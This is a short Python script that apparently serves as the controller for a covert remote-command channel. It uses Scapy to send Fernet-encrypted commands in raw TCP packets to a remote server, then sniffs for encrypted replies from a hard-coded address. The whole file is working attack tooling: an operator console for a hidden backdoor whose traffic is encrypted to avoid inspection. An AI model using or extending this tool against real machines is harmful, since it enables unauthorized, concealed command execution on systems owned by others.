#!/usr/bin/env python3


from scapy.all import *
from cryptography.fernet import Fernet
import argparse
import encrypt_utils as utils


parser = argparse.ArgumentParser()

parser.add_argument("-d",
                    "--destination",
                    type=str,
                    help="IP of remote server, to send commands to",
                    required=True)

parser.add_argument("-p",
                    "--port",
                    type=str,
                    help="Port of remote host",
                    required=True)                        

global args
args = parser.parse_args()


def send_command(destination, port, command):
    encrypted_command = utils.encrypt_data(command.encode("utf-8"))
    pkt = IP(dst=destination)/TCP(sport=RandShort(), dport=int(port))/Raw(load=encrypted_command)

    send(pkt, verbose=False)


def display_output(packet):
    data = packet[Raw].load

    # Decrypt output
    data = utils.decrypt_data(data)

    print(data.decode("utf-8"))


def main():
    print("Welcome\n")

    while True:
        data = input("> ")

        if data == ":q":
            print("Sent shutdown signal to remote server, and quitting...")
            send_command(args.destination, args.port, data)
            sys.exit()

        send_command(args.destination, args.port, data)
        sniff(filter="ip and tcp and host 192.168.1.81", count=1, prn=display_output)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting program...")
        sys.exit()
